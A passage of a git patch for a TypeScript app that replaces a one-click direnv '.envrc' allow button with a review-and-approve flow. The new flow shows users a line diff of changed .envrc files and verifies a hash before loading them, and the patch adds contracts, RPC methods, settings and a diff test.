+ import * as Keybindings from "./keybindings.ts";
+@@ -519,6 +520,12 @@ const layerScheduledTaskWebhookOrigin = Layer.effect(
+ );
+ 
+ const layerOrchestrationV2Runtime = RuntimeLayer.layerProduction.pipe(
++  Layer.provideMerge(
++    ProjectEnvironmentService.layer.pipe(
++      Layer.provide(RuntimeLayer.layerProjectService),
++      Layer.provide(ProjectionStoreV2.layer),
++    ),
++  ),
+   Layer.provideMerge(DirenvEnvironment.layer.pipe(Layer.provide(ProcessRunner.layer))),
+   Layer.provide(layerScheduledTaskWebhookOrigin),
+   Layer.provide(ProviderEventIngestor.layerAnalytics),
+diff --git a/apps/server/src/ws.ts b/apps/server/src/ws.ts
+index d90b35b2b5..0ff7f8bb3f 100644
+--- a/apps/server/src/ws.ts
++++ b/apps/server/src/ws.ts
+@@ -215,7 +215,7 @@ import * as ProjectService from "./project/ProjectService.ts";
+ import { threadWorkspaceRoot } from "./project/threadWorkspaceRoot.ts";
+ import * as ManagedProjectFolders from "./project/ManagedProjectFolders.ts";
+ import * as ScratchThreadPromotion from "./project/ScratchThreadPromotion.ts";
+-import * as DirenvEnvironment from "./provider/DirenvEnvironment.ts";
++import * as ProjectEnvironmentService from "./project/ProjectEnvironmentService.ts";
+ import { projectMutationOperation } from "./project/ProjectMutation.ts";
+ import * as ProjectCloneTracker from "./project/ProjectCloneTracker.ts";
+ import * as RepositoryIdentityResolver from "./project/RepositoryIdentityResolver.ts";
+@@ -1304,38 +1304,9 @@ export const layerWsRpc = (
+       const repositoryIdentityResolver =
+         yield* RepositoryIdentityResolver.RepositoryIdentityResolver;
+       const projectEnrichment = yield* ProjectEnrichmentService.ProjectEnrichmentService;
+-      const direnvEnvironment = yield* Effect.serviceOption(DirenvEnvironment.DirenvEnvironment);
+-      const allowThreadDirenv = Effect.fn("ws.allowThreadDirenv")(function* (threadId: ThreadId) {
+-        const thread = yield* threadManagement.getThreadRecords(threadId, []).pipe(
+-          Effect.map((records) => records.thread),
+-          Effect.orElseSucceed(() => undefined),
+-        );
+-        const project =
+-          thread === undefined || thread.worktreePath !== null
+-            ? undefined
+-            : Option.getOrUndefined(
+-                yield* projectService
+-                  .getById(thread.projectId)
+-                  .pipe(Effect.orElseSucceed(() => Option.none())),
+-              );
+-        // The same directory RuntimePolicyV2 starts the thread's provider in.
+-        const cwd = thread?.worktreePath ?? project?.workspaceRoot;
+-        if (cwd === undefined) {
+-          return { allowed: false, error: "The thread has no workspace." };
+-        }
+-        if (Option.isNone(direnvEnvironment)) {
+-          return { allowed: false, error: "direnv support is unavailable on this server." };
+-        }
+-        const result = yield* direnvEnvironment.value.allow(cwd);
+-        switch (result._tag) {
+-          case "Allowed":
+-            return { allowed: true };
+-          case "NotFound":
+-            return { allowed: false, error: "No .envrc governs the thread's workspace." };
+-          case "Failed":
+-            return { allowed: false, error: result.message };
+-        }
+-      });
++      const projectEnvironment = yield* Effect.serviceOption(
++        ProjectEnvironmentService.ProjectEnvironmentService,
++      );
+       const agentSessionScanner = yield* AgentSessionScanner.AgentSessionScanner;
+       const agentSessionImporter = yield* AgentSessionImporter.AgentSessionImporter;
+       const checkpointDiffQuery = yield* CheckpointDiffQuery.CheckpointDiffQuery;
+@@ -2961,7 +2932,22 @@ export const layerWsRpc = (
+           worktreeSetupTracker
+             .cancel(input.threadId)
+             .pipe(Effect.map((cancelled) => ({ cancelled }))),
+-        [WS_METHODS.projectEnvironmentAllowDirenv]: (input) => allowThreadDirenv(input.threadId),
++        [WS_METHODS.projectEnvironmentStatus]: (input) =>
++          Option.isNone(projectEnvironment)
++            ? Effect.succeed({
++                envrc: null,
++                pending: "none",
++                approvedContent: null,
++                enabled: false,
++              } as const)
++            : projectEnvironment.value.status(input),
++        [WS_METHODS.projectEnvironmentApprove]: (input) =>
++          Option.isNone(projectEnvironment)
++            ? Effect.succeed({
++                approved: false,
++                error: "direnv support is unavailable on this server.",
++              })
++            : projectEnvironment.value.approve(input),
+         [WS_METHODS.vcsRefreshStatus]: (input) =>
+           vcsStatusBroadcaster.refreshStatus(input.cwd, { localOnly: input.localOnly ?? false }),
+         [WS_METHODS.vcsPull]: (input) =>
+diff --git a/apps/web/src/components/chat/TimelineWorkEntryRow.tsx b/apps/web/src/components/chat/TimelineWorkEntryRow.tsx
+index 9a0223c612..d4bb91d2b5 100644
+--- a/apps/web/src/components/chat/TimelineWorkEntryRow.tsx
++++ b/apps/web/src/components/chat/TimelineWorkEntryRow.tsx
+@@ -13,7 +13,6 @@ import {
+   ThreadId,
+ } from "@t3tools/contracts";
+ import { scopeThreadRef } from "@t3tools/client-runtime/environment";
+-import { useAtomValue } from "@effect/atom-react";
+ import { Link } from "@tanstack/react-router";
+ import { notificationChildThreadId } from "@t3tools/client-runtime/state/thread-execution";
+ import {
+@@ -38,9 +37,9 @@ import { ChevronRightIcon, CircleAlertIcon, XIcon, RotateCcwIcon } from "lucide-
+ import { Button, InlineButton } from "../ui/button";
+ import { useAssetUrls } from "../../assets/assetUrls";
+ import { useThreadShell } from "../../state/entities";
+-import { threadEnvironment } from "../../state/threads";
+-import { useAtomCommand } from "../../state/use-atom-command";
+-import { toastManager } from "../ui/toast";
++import { useEnvironmentQuery } from "../../state/query";
++import { appAtomRegistry } from "../../rpc/atomRegistry";
++import { projectEnvironment } from "../../state/projectEnvironment";
+ import {
+   threadReadLabelPrefix,
+   threadReadTargetId,
+@@ -153,61 +152,26 @@ type WorkEntryRowProps = {
+   onToggleEntry?: ((collapsed: boolean) => void) | undefined;
+ };
+ 
+-/** Allows the thread's blocked `.envrc`; the next message loads it. */
+-// The virtualized timeline remounts rows, so the outcome outlives the button.
+-const allowedDirenvWarnings = new Set<string>();
+-
+-function AllowDirenvButton({
+-  threadRef,
+-  warningId,
+-}: {
+-  readonly threadRef: ScopedThreadRef;
+-  readonly warningId: string;
+-}) {
+-  const allowDirenv = useAtomCommand(threadEnvironment.allowDirenv);
+-  const [state, setState] = useState<"idle" | "pending" | "allowed">(() =>
+-    allowedDirenvWarnings.has(warningId) ? "allowed" : "idle",
+-  );
+-  // Clients without the operate grant can read the warning but not act on it.
+-  const permitted = useAtomValue(
+-    threadEnvironment.allowDirenv.permissionAtom(threadRef.environmentId),
+-  );
+-  if (!permitted) return null;
+-  const onClick = async (event: MouseEvent<HTMLButtonElement>) => {
++/** Brings back the composer's review of the thread's blocked `.envrc`. */
++function ReviewEnvrcButton({ threadRef }: { readonly threadRef: ScopedThreadRef }) {
++  const shell = useThreadShell(threadRef);
++  const target = shell ? { ...threadRef, projectId: shell.projectId } : null;
++  const status = useEnvironmentQuery(target ? projectEnvironment.statusAtom(target) : null);
++  if (target === null || status.data?.pending === "none") return null;
++  const onClick = (event: MouseEvent<HTMLButtonElement>) => {
+     event.stopPropagation();
+-    setState("pending");
+-    const result = await allowDirenv({
+-      environmentId: threadRef.environmentId,
+-      input: { threadId: threadRef.threadId },
+-    });
+-    if (result._tag === "Success" && result.value.allowed) {
+-      allowedDirenvWarnings.add(warningId);
+-      setState("allowed");
+-      return;
+-    }
+-    setState("idle");
+-    if (result._tag === "Success") {
+-      toastManager.add({
+-        type: "error",
+-        title: "Could not allow the .envrc",
+-        description: result.value.error,
+-      });
+-    }
++    projectEnvironment.reviewAgain(appAtomRegistry, target);
++    status.refresh();
+   };
+   return (
+     <Button
+-      disabled={state !== "idle"}
+       onClick={onClick}
+       onKeyDown={(event) => event.stopPropagation()}
+       size="xs"
+       type="button"
+       variant="ghost-muted"
+     >
+-      {state === "allowed"
+-        ? "Allowed · applies to your next message"
+-        : state === "pending"
+-          ? "Allowing…"
+-          : "Allow .envrc"}
++      Review .envrc
+     </Button>
+   );
+ }
+@@ -552,7 +516,7 @@ function WorkEntryLogRow(props: WorkEntryRowProps) {
+             <XIcon aria-hidden className={cn("size-3 shrink-0", failedToolIconClassName)} />
+           ) : null}
+           {workEntry.warningAction?.type === "direnv.allow" && threadRef ? (
+-            <AllowDirenvButton threadRef={threadRef} warningId={workEntry.id} />
++            <ReviewEnvrcButton threadRef={threadRef} />
+           ) : null}
+           <TimelineRowTimestamp createdAt={workEntry.createdAt} timestampFormat={timestampFormat} />
+           <span
+diff --git a/apps/web/src/state/projectEnvironment.ts b/apps/web/src/state/projectEnvironment.ts
+new file mode 100644
+index 0000000000..5c3ad27ae0
+--- /dev/null
++++ b/apps/web/src/state/projectEnvironment.ts
+@@ -0,0 +1,26 @@
++import { createProjectEnvironmentAtoms } from "@t3tools/client-runtime/state/projectEnvironment";
++import { Atom } from "effect/reactivity";
++
++import { connectionAtomRuntime } from "../connection/runtime";
++import { serverEnvironment } from "./server";
++import { environmentThreadShells } from "./threads";
++
++export const projectEnvironment = createProjectEnvironmentAtoms(connectionAtomRuntime, {
++  // Each run and each settings change; a run's start is when a changed .envrc surfaces.
++  refreshSignal: ({ environmentId, projectId, threadId }) =>
++    Atom.make((get) => {
++      const settings = get(serverEnvironment.configValueAtom(environmentId))?.settings;
++      const run =
++        threadId === null
++          ? null
++          : get(environmentThreadShells.quietThreadShellAtom({ environmentId, threadId }))
++              ?.latestRun;
++      return JSON.stringify([
++        settings?.enableDirenvEnvironment,
++        settings?.trustDirenvChanges,
++        settings?.projectSettingsOverrides[projectId],
++        run?.runId,
++        run?.status,
++      ]);
++    }),
++});
+diff --git a/packages/client-runtime/package.json b/packages/client-runtime/package.json
+index 5808641a56..964ae385e1 100644
+--- a/packages/client-runtime/package.json
++++ b/packages/client-runtime/package.json
+@@ -139,6 +139,10 @@
+       "types": "./src/relay/index.ts",
+       "default": "./src/relay/index.ts"
+     },
++    "./state/projectEnvironment": {
++      "types": "./src/state/projectEnvironment.ts",
++      "default": "./src/state/projectEnvironment.ts"
++    },
+     "./state/auth": {
+       "types": "./src/state/auth.ts",
+       "default": "./src/state/auth.ts"
+diff --git a/packages/client-runtime/src/state/commandPermissions.test.ts b/packages/client-runtime/src/state/commandPermissions.test.ts
+index 8af0f3cf63..54a153bb24 100644
+--- a/packages/client-runtime/src/state/commandPermissions.test.ts
++++ b/packages/client-runtime/src/state/commandPermissions.test.ts
+@@ -122,11 +122,11 @@ describe("command permissions", () => {
+     ),
+   );
+ 
+-  it.effect("requires the destination operate grant to allow a project's .envrc", () =>
++  it.effect("requires the destination operate grant to approve a project's .envrc", () =>
+     Effect.scoped(
+       Effect.gen(function* () {
+         const registry = yield* setup;
+-        const allow = createCommandPermissions(runtime, WS_METHODS.projectEnvironmentAllowDirenv);
++        const allow = createCommandPermissions(runtime, WS_METHODS.projectEnvironmentApprove);
+         registry.set(sessions(env), AsyncResult.success(grant(false)));
+         expect(registry.get(allow.permissionAtom(env))).toBe(false);
+         expect((yield* allow.authorize(registry, env).pipe(Effect.flip))._tag).toBe(
+diff --git a/packages/client-runtime/src/state/projectEnvironment.test.ts b/packages/client-runtime/src/state/projectEnvironment.test.ts
+new file mode 100644
+index 0000000000..c76e2d6ccd
+--- /dev/null
++++ b/packages/client-runtime/src/state/projectEnvironment.test.ts
+@@ -0,0 +1,19 @@
++import { describe, expect, it } from "vite-plus/test";
++
++import { diffEnvrc } from "./projectEnvironment.ts";
++
++describe("diffEnvrc", () => {
++  it("marks removed and added lines around the unchanged ones", () => {
++    expect(
++      diffEnvrc(
++        "use flake\ndotenv\nwatch_file flake.lock",
++        "use flake\nexport A=1\nwatch_file flake.lock",
++      ),
++    ).toEqual([
++      { kind: "same", text: "use flake" },
++      { kind: "removed", text: "dotenv" },
++      { kind: "added", text: "export A=1" },
++      { kind: "same", text: "watch_file flake.lock" },
++    ]);
++  });
++});
+diff --git a/packages/client-runtime/src/state/projectEnvironment.ts b/packages/client-runtime/src/state/projectEnvironment.ts
+new file mode 100644
+index 0000000000..1410275293
+--- /dev/null
++++ b/packages/client-runtime/src/state/projectEnvironment.ts
+@@ -0,0 +1,174 @@
++import {
++  type EnvironmentId,
++  type ProjectEnvironmentStatus,
++  type ProjectEnvironmentStatusInput,
++  type ProjectId,
++  type ThreadId,
++  WS_METHODS,
++} from "@t3tools/contracts";
++import { Atom, type AtomRegistry } from "effect/reactivity";
++
++import type { EnvironmentRegistry } from "../connection/registry.ts";
++import { createEnvironmentRpcCommand, createEnvironmentRpcQueryAtomFamily } from "./runtime.ts";
++
++export interface ProjectEnvironmentTarget {
++  readonly environmentId: EnvironmentId;
++  readonly projectId: ProjectId;
++  /** Without a thread, the project's own checkout. */
++  readonly threadId: ThreadId | null;
++}
++
++const projectKey = (target: ProjectEnvironmentTarget) =>
++  `${target.environmentId}:${target.projectId}:`;
++
++/**
++ * `refreshSignal` re-reads the status whenever its value changes, such as on each run or
++ * settings change, so edits to the `.envrc` and approvals from other clients show up.
++ */
++export function createProjectEnvironmentAtoms<R, E>(
++  runtime: Atom.AtomRuntime<EnvironmentRegistry | R, E>,
++  options: {
++    readonly refreshSignal?: (target: ProjectEnvironmentTarget) => Atom.Atom<unknown>;
++  } = {},
++) {
++  const { refreshSignal } = options;
++  const status = createEnvironmentRpcQueryAtomFamily(runtime, {
++    label: "environment-data:project-environment:status",
++    tag: WS_METHODS.projectEnvironmentStatus,
++    ...(refreshSignal === undefined
++      ? {}
++      : {
++          refreshTrigger: (target: {
++            readonly environmentId: EnvironmentId;
++            readonly input: ProjectEnvironmentStatusInput;
++          }) =>
++            refreshSignal({
++              environmentId: target.environmentId,
++              projectId: target.input.projectId,
++              threadId: target.input.threadId ?? null,
++            }),
++        }),
++  });
++  // "Not now" lasts for the session, per reviewed content, until a thread asks for a review.
++  const dismissedAtom = Atom.make<{ readonly dismissed: ReadonlySet<string> }>({
++    dismissed: new Set<string>(),
++  }).pipe(Atom.keepAlive);
++  return {
++    statusAtom: (target: ProjectEnvironmentTarget) =>
++      status({
++        environmentId: target.environmentId,
++        input: {
++          projectId: target.projectId,
++          ...(target.threadId === null ? {} : { threadId: target.threadId }),
++        },
++      }),
++    approve: createEnvironmentRpcCommand(runtime, {
++      label: "environment-data:project-environment:approve",
++      tag: WS_METHODS.projectEnvironmentApprove,
++    }),
++    dismissedAtom,
++    isDismissed: (
++      dismissed: ReadonlySet<string>,
++      target: ProjectEnvironmentTarget,
++      sha256: string,
++    ) => dismissed.has(projectKey(target) + sha256),
++    dismiss: (
++      registry: AtomRegistry.AtomRegistry,
++      target: ProjectEnvironmentTarget,
++      sha256: string,
++    ) =>
++      registry.set(dismissedAtom, {
++        dismissed: new Set([...registry.get(dismissedAtom).dismissed, projectKey(target) + sha256]),
++      }),
++    /** Brings back the review a "Not now" hid, for this project only. */
++    reviewAgain: (registry: AtomRegistry.AtomRegistry, target: ProjectEnvironmentTarget) =>
++      registry.set(dismissedAtom, {
++        dismissed: new Set(
++          [...registry.get(dismissedAtom).dismissed].filter(
++            (key) => !key.startsWith(projectKey(target)),
++          ),
++        ),
++      }),
++  };
++}
++
++export interface ProjectEnvironmentReview {
++  readonly changed: boolean;
++  readonly sha256: string;
++  readonly tooLarge: boolean;
++  /** `same` lines with no diff marks for a first review. */
++  readonly lines: ReadonlyArray<EnvrcDiffLine>;
++}
++
++/** What the user reviews before approving, or null when nothing waits for approval. */
++export function projectEnvironmentReview(
++  status: ProjectEnvironmentStatus | null,
++): ProjectEnvironmentReview | null {
++  if (status === null || status.pending === "none" || status.envrc === null) return null;
++  const { envrc } = status;
++  const changed = status.pending === "approve-change" && status.approvedContent !== null;
++  return {
++    changed,
++    sha256: envrc.sha256,
++    tooLarge: envrc.tooLarge,
++    lines: envrc.tooLarge
++      ? []
++      : changed
++        ? diffEnvrc(status.approvedContent!, envrc.content)
++        : envrc.content.split("\n").map((text) => ({ kind: "same", text })),
++  };
++}
++
++/** The thread details indicator; null hides it, when no `.envrc` or direnv is available. */
++export function projectEnvironmentIndicator(
++  status: ProjectEnvironmentStatus | null,
++): "on" | "off" | "approval" | null {
++  if (status === null || status.envrc === null) return null;
++  return !status.enabled ? "off" : status.pending === "none" ? "on" : "approval";
++}
++
++export interface EnvrcDiffLine {
++  readonly kind: "same" | "added" | "removed";
++  readonly text: string;
++}
++
++// `.envrc` files are a few dozen lines; past this, show the new content as added.
++const MAX_DIFF_LINES = 400;
++
++/** A line diff of an `.envrc` change, for the user to review before approving it. */
++export function diffEnvrc(previous: string, next: string): ReadonlyArray<EnvrcDiffLine> {
++  const before = previous.split("\n");
++  const after = next.split("\n");
++  if (before.length > MAX_DIFF_LINES || after.length > MAX_DIFF_LINES) {
++    return after.map((text) => ({ kind: "added", text }));
++  }
++  // Longest common subsequence lengths of each pair of suffixes.
++  const lengths = Array.from({ length: before.length + 1 }, () =>
++    new Array<number>(after.length + 1).fill(0),
++  );
++  for (let i = before.length - 1; i >= 0; i--) {
++    for (let j = after.length - 1; j >= 0; j--) {
++      lengths[i]![j] =
++        before[i] === after[j]
++          ? lengths[i + 1]![j + 1]! + 1
++          : Math.max(lengths[i + 1]![j]!, lengths[i]![j + 1]!);
++    }
++  }
++  const lines: EnvrcDiffLine[] = [];
++  let i = 0;
++  let j = 0;
++  while (i < before.length && j < after.length) {
++    if (before[i] === after[j]) {
++      lines.push({ kind: "same", text: before[i]! });
++      i++;
++      j++;
++    } else if (lengths[i + 1]![j]! >= lengths[i]![j + 1]!) {
++      lines.push({ kind: "removed", text: before[i++]! });
++    } else {
++      lines.push({ kind: "added", text: after[j++]! });
++    }
++  }
++  while (i < before.length) lines.push({ kind: "removed", text: before[i++]! });
++  while (j < after.length) lines.push({ kind: "added", text: after[j++]! });
++  return lines;
++}
+diff --git a/packages/client-runtime/src/state/threadCommands.ts b/packages/client-runtime/src/state/threadCommands.ts
+index d5381e32d0..0f34a92667 100644
+--- a/packages/client-runtime/src/state/threadCommands.ts
++++ b/packages/client-runtime/src/state/threadCommands.ts
+@@ -363,10 +363,6 @@ export function createThreadEnvironmentAtoms<R, E>(
+       scheduler,
+       concurrency,
+     }),
+-    allowDirenv: createEnvironmentRpcCommand(runtime, {
+-      label: "environment-data:commands:thread:allow-direnv",
+-      tag: WS_METHODS.projectEnvironmentAllowDirenv,
+-    }),
+   };
+   const optimistic = createOptimisticThreadLifecycle(snapshotAtom);
+   return {
+diff --git a/packages/contracts/src/clientRpcPermissions.ts b/packages/contracts/src/clientRpcPermissions.ts
+index 236023429a..52382442f5 100644
+--- a/packages/contracts/src/clientRpcPermissions.ts
++++ b/packages/contracts/src/clientRpcPermissions.ts
+@@ -59,7 +59,7 @@ export const CLIENT_GUARDED_RPC_SCOPES = {
+   [WS_METHODS.scheduledTasksDelete]: AuthOrchestrationOperateScope,
+   [WS_METHODS.scheduledTasksRunNow]: AuthOrchestrationOperateScope,
+   [WS_METHODS.scheduledTasksRotateWebhookToken]: AuthOrchestrationOperateScope,
+-  [WS_METHODS.projectEnvironmentAllowDirenv]: AuthOrchestrationOperateScope,
++  [WS_METHODS.projectEnvironmentApprove]: AuthOrchestrationOperateScope,
+   [ORCHESTRATION_V2_WS_METHODS.stopWorkflow]: AuthOrchestrationOperateScope,
+   // A guest link hands thread access to someone outside, like a pairing link.
+   [WS_METHODS.guestShareCreate]: AuthAccessWriteScope,
+diff --git a/packages/contracts/src/projectEnvironment.ts b/packages/contracts/src/projectEnvironment.ts
+index 37a2292453..1f0c69bead 100644
+--- a/packages/contracts/src/projectEnvironment.ts
++++ b/packages/contracts/src/projectEnvironment.ts
+@@ -1,18 +1,55 @@
+ import * as Schema from "effect/Schema";
+ 
+-import { ThreadId } from "./baseSchemas.ts";
++import { ProjectId, ThreadId } from "./baseSchemas.ts";
+ 
+ /**
+- * `direnv allow` the `.envrc` governing a thread's workspace. The server
+- * resolves the directory from the thread, so a client cannot name an
+- * arbitrary path. The next message picks the environment up.
++ * A project's direnv environment, seen from the directory a thread works in.
++ * Without a thread, the project's own checkout. The server resolves the
++ * directory, so a client cannot name an arbitrary path.
+  */
+-export const ProjectEnvironmentAllowDirenvInput = Schema.Struct({ threadId: ThreadId });
+-export type ProjectEnvironmentAllowDirenvInput = typeof ProjectEnvironmentAllowDirenvInput.Type;
++const ProjectEnvironmentTarget = {
++  projectId: ProjectId,
++  threadId: Schema.optional(ThreadId),
++};
+ 
+-export const ProjectEnvironmentAllowDirenvResult = Schema.Struct({
+-  allowed: Schema.Boolean,
+-  /** Why nothing was allowed. */
++export const ProjectEnvironmentStatusInput = Schema.Struct(ProjectEnvironmentTarget);
++export type ProjectEnvironmentStatusInput = typeof ProjectEnvironmentStatusInput.Type;
++
++export const ProjectEnvironmentEnvrc = Schema.Struct({
++  path: Schema.String,
++  /** Empty when `tooLarge`: such a file can only be approved with `direnv allow`. */
++  content: Schema.String,
++  sha256: Schema.String,
++  tooLarge: Schema.Boolean,
++});
++export type ProjectEnvironmentEnvrc = typeof ProjectEnvironmentEnvrc.Type;
++
++/**
++ * `approve`: the project's first `.envrc`. `approve-change`: an `.envrc` that
++ * differs from the one approved before, which `approvedContent` holds.
++ */
++export const ProjectEnvironmentPending = Schema.Literals(["none", "approve", "approve-change"]);
++export type ProjectEnvironmentPending = typeof ProjectEnvironmentPending.Type;
++
++export const ProjectEnvironmentStatus = Schema.Struct({
++  envrc: Schema.NullOr(ProjectEnvironmentEnvrc),
++  pending: ProjectEnvironmentPending,
++  approvedContent: Schema.NullOr(Schema.String),
++  /** False when Load direnv environment is off, or direnv is not installed. */
++  enabled: Schema.Boolean,
++});
++export type ProjectEnvironmentStatus = typeof ProjectEnvironmentStatus.Type;
++
++/** Approve the `.envrc` the user reviewed; `sha256` must still match the file. */
++export const ProjectEnvironmentApproveInput = Schema.Struct({
++  ...ProjectEnvironmentTarget,
++  sha256: Schema.String,
++});
++export type ProjectEnvironmentApproveInput = typeof ProjectEnvironmentApproveInput.Type;
++
++export const ProjectEnvironmentApproveResult = Schema.Struct({
++  approved: Schema.Boolean,
++  /** Why nothing was approved. */
+   error: Schema.optional(Schema.String),
+ });
+-export type ProjectEnvironmentAllowDirenvResult = typeof ProjectEnvironmentAllowDirenvResult.Type;
++export type ProjectEnvironmentApproveResult = typeof ProjectEnvironmentApproveResult.Type;
+diff --git a/packages/contracts/src/rpc.ts b/packages/contracts/src/rpc.ts
+index 91380c6bab..51b4caafe6 100644
+--- a/packages/contracts/src/rpc.ts
++++ b/packages/contracts/src/rpc.ts
+@@ -117,8 +117,10 @@ import {
+   OrchestrationGetTurnDiffError,
+ } from "./checkpointDiff.ts";
+ import {
+-  ProjectEnvironmentAllowDirenvInput,
+-  ProjectEnvironmentAllowDirenvResult,
++  ProjectEnvironmentApproveInput,
++  ProjectEnvironmentApproveResult,
++  ProjectEnvironmentStatus,
++  ProjectEnvironmentStatusInput,
+ } from "./projectEnvironment.ts";
+ import {
+   WorktreeSetupCancelInput,
+@@ -596,7 +598,8 @@ export const WS_METHODS = {
+   subscribeVcsStatus: "subscribeVcsStatus",
+   subscribeWorktreeSetup: "subscribeWorktreeSetup",
+   worktreeSetupCancel: "worktreeSetup.cancel",
+-  projectEnvironmentAllowDirenv: "projectEnvironment.allowDirenv",
++  projectEnvironmentStatus: "projectEnvironment.status",
++  projectEnvironmentApprove: "projectEnvironment.approve",
+   subscribeTerminalMetadata: "subscribeTerminalMetadata",
+   subscribePreviewEvents: "subscribePreviewEvents",
+   subscribeDiscoveredLocalServers: "subscribeDiscoveredLocalServers",
+@@ -1448,9 +1451,15 @@ const WsWorktreeSetupCancelRpc = Rpc.make(WS_METHODS.worktreeSetupCancel, {
+   error: EnvironmentAuthorizationError,
+ });
+ 
+-const WsProjectEnvironmentAllowDirenvRpc = Rpc.make(WS_METHODS.projectEnvironmentAllowDirenv, {
+-  payload: ProjectEnvironmentAllowDirenvInput,
+-  success: ProjectEnvironmentAllowDirenvResult,
++const WsProjectEnvironmentStatusRpc = Rpc.make(WS_METHODS.projectEnvironmentStatus, {
++  payload: ProjectEnvironmentStatusInput,
++  success: ProjectEnvironmentStatus,
++  error: EnvironmentAuthorizationError,
++});
++
++const WsProjectEnvironmentApproveRpc = Rpc.make(WS_METHODS.projectEnvironmentApprove, {
++  payload: ProjectEnvironmentApproveInput,
++  success: ProjectEnvironmentApproveResult,
+   error: EnvironmentAuthorizationError,
+ });
+ 
+@@ -2083,7 +2092,8 @@ export const WsRpcGroup = RpcGroup.make(
+   WsSubscribeVcsStatusRpc,
+   WsSubscribeWorktreeSetupRpc,
+   WsWorktreeSetupCancelRpc,
+-  WsProjectEnvironmentAllowDirenvRpc,
++  WsProjectEnvironmentStatusRpc,
++  WsProjectEnvironmentApproveRpc,
+   WsVcsPullRpc,
+   WsVcsRefreshStatusRpc,
+   WsGitRunStackedActionRpc,
+diff --git a/packages/contracts/src/settings.ts b/packages/contracts/src/settings.ts
+index 81ae1b148e..ef68d93e07 100644
+--- a/packages/contracts/src/settings.ts
++++ b/packages/contracts/src/settings.ts
+@@ -1009,6 +1009,7 @@ export const PROJECT_SCOPED_SERVER_SETTING_KEYS = [
+   "enableAgentBrowserAccess",
+   "enableAgentDeviceAccess",
+   "enableDirenvEnvironment",
++  "trustDirenvChanges",
+   "textGenerationModelSelection",
+   "threadTitleInstructions",
+   "sourceControlWriterModelSelection",
+@@ -1047,6 +1048,7 @@ export const ProjectSettingsOverrides = Schema.Struct({
+   enableAgentBrowserAccess: Schema.optionalKey(Schema.Boolean),
+   enableAgentDeviceAccess: Schema.optionalKey(Schema.Boolean),
+   enableDirenvEnvironment: Schema.optionalKey(Schema.Boolean),
++  trustDirenvChanges: Schema.optionalKey(Schema.Boolean),
+   textGenerationModelSelection: Schema.optionalKey(ModelSelection),
+   threadTitleInstructions: Schema.optionalKey(TrimmedString),
+   sourceControlWriterModelSelection: Schema.optionalKey(Schema.NullOr(ModelSelection)),
+@@ -1203,11 +1205,13 @@ export const ServerSettings = Schema.Struct({
+ 
+   enableAgentDeviceAccess: Schema.Boolean.pipe(Schema.withDecodingDefault(Effect.succeed(false))),
+   /**
+-   * Whether provider sessions load the project's direnv environment (`.envrc`),
+-   * as a shell with the direnv hook would. Only `.envrc` files the user has
+-   * already approved with `direnv allow` are loaded.
++   * Whether agents and worktree setup load the project's direnv environment
++   * (`.envrc`). Each `.envrc` content still needs the user's approval, or a
++   * `direnv allow` from their shell, before it loads.
+    */
+   enableDirenvEnvironment: Schema.Boolean.pipe(Schema.withDecodingDefault(Effect.succeed(true))),
++  /** Approve every change to an approved project's `.envrc` without asking. */
++  trustDirenvChanges: Schema.Boolean.pipe(Schema.withDecodingDefault(Effect.succeed(false))),
+   /** Enabling the Device panel must not grant providers device control. */
+   enableDeviceSupport: Schema.Boolean.pipe(Schema.withDecodingDefault(Effect.succeed(false))),
+   deviceOnboardingCompleted: Schema.Boolean.pipe(Schema.withDecodingDefault(Effect.succeed(false))),
+@@ -1570,6 +1574,7 @@ export const ServerSettingsPatch = Schema.Struct({
+   ),
+   enableAgentDeviceAccess: Schema.optionalKey(Schema.Boolean),
+   enableDirenvEnvironment: Schema.optionalKey(Schema.Boolean),
++  trustDirenvChanges: Schema.optionalKey(Schema.Boolean),
+   enableDeviceSupport: Schema.optionalKey(Schema.Boolean),
+   deviceOnboardingCompleted: Schema.optionalKey(Schema.Boolean),
+   deviceHosts: Schema.optionalKey(SshDeviceHostConfigs),
+-- 
+2.56.0
+
